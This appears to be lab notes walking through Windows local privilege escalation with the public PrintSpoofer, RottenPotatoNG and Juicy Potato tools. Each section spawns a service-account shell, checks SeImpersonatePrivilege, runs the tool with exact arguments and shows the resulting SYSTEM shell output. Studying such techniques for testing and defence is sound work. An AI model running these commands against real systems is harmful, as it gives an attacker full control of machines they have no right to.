Thanks for : 

https://github.com/itm4n/PrintSpoofer
https://github.com/breenmachine/RottenPotatoNG
https://github.com/ohpe/juicy-potato

# PrintSpoofer

 This attack requires SeImpersonatePrivilege privilege

First we will spawn a nt "authority\network service" shell with psexec

	PSTools>PsExec.exe -i -u "nt authority\network service" cmd.exe

In newly spawned shell check who you are

	C:\Windows\system32>whoami
	nt authority\network service
	
	C:\Windows\system32>whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
	SeShutdownPrivilege           Shut down the system                      Disabled
	SeAuditPrivilege              Generate security audits                  Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
	SeUndockPrivilege             Remove computer from docking station      Disabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	SeCreateGlobalPrivilege       Create global objects                     Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
	SeTimeZonePrivilege           Change the time zone                      Disabled


Use PrintSpoofer64.exe and get system shell

	C:\Windows\system32>c:\tmp\PrintSpoofer64.exe -i -c powershell.exe
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[+] CreateProcessAsUser() OK
	Windows PowerShell
	Copyright (C) 2015 Microsoft Corporation. All rights reserved.
	
	PS C:\Windows\system32> whoami
	nt authority\system
	PS C:\Windows\system32> whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                  Description                                   State
	=============================== ============================================= =======
	SeCreateTokenPrivilege          Create a token object                         Enabled
	SeAssignPrimaryTokenPrivilege   Replace a process level token                 Enabled
	SeLockMemoryPrivilege           Lock pages in memory                          Enabled
	.
	.
	.
	SeRelabelPrivilege              Modify an object label                        Enabled
	SeIncreaseWorkingSetPrivilege   Increase a process working set                Enabled
	SeTimeZonePrivilege             Change the time zone                          Enabled
	SeCreateSymbolicLinkPrivilege   Create symbolic links                         Enabled


# RottenPotatoNG

Start a cmd with "local service" permission

	PSTools>PsExec.exe -i -u "nt authority\local service" cmd.exe

check permissions

	C:\Windows\system32>whoami
	nt authority\local service
	
	C:\Windows\system32>whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
	SeSystemtimePrivilege         Change the system time                    Disabled
	SeShutdownPrivilege           Shut down the system                      Disabled
	SeAuditPrivilege              Generate security audits                  Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
	SeUndockPrivilege             Remove computer from docking station      Disabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	SeCreateGlobalPrivilege       Create global objects                     Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
	SeTimeZonePrivilege           Change the time zone                      Disabled

Run MSFRottenPotato.exe, it will spawn a new cmd.exe with system privileges :)

	C:\Windows\system32>c:\tmp\MSFRottenPotato.exe
	COM -> bytes received: 116
	RPC -> bytes Sent: 116
	.
	.
	.
	COM -> bytes sent: 60
	COM -> bytes received: 42
	RPC -> bytes Sent: 42
	RPC -> bytes received: 56
	COM -> bytes sent: 56
	Running C:\Windows\System32\cmd.exe with args
	Auth result: 0
	Return code: 0
	Last error: 0

On new console

	C:\Windows\system32>whoami
	nt authority\system

# Juicy Potato

First spawn a shell with "local service" privs

	PSTools>PsExec.exe -i -u "nt authority\local service" cmd.exe

check your current privileges

	C:\Windows\system32>whoami
	nt authority\local service
	
	C:\Windows\system32>whoami /priv
	
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
	SeSystemtimePrivilege         Change the system time                    Disabled
	SeShutdownPrivilege           Shut down the system                      Disabled
	SeAuditPrivilege              Generate security audits                  Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
	SeUndockPrivilege             Remove computer from docking station      Disabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	SeCreateGlobalPrivilege       Create global objects                     Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
	SeTimeZonePrivilege           Change the time zone                      Disabled

Fire up bad boy, it will spawn a cmd for you :)

	C:\Windows\system32>c:\tmp\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
	Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
	......
	[+] authresult 0
	{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
	
	[+] CreateProcessWithTokenW OK

privs on new shell

	C:\Windows\system32>whoami
	nt authority\system
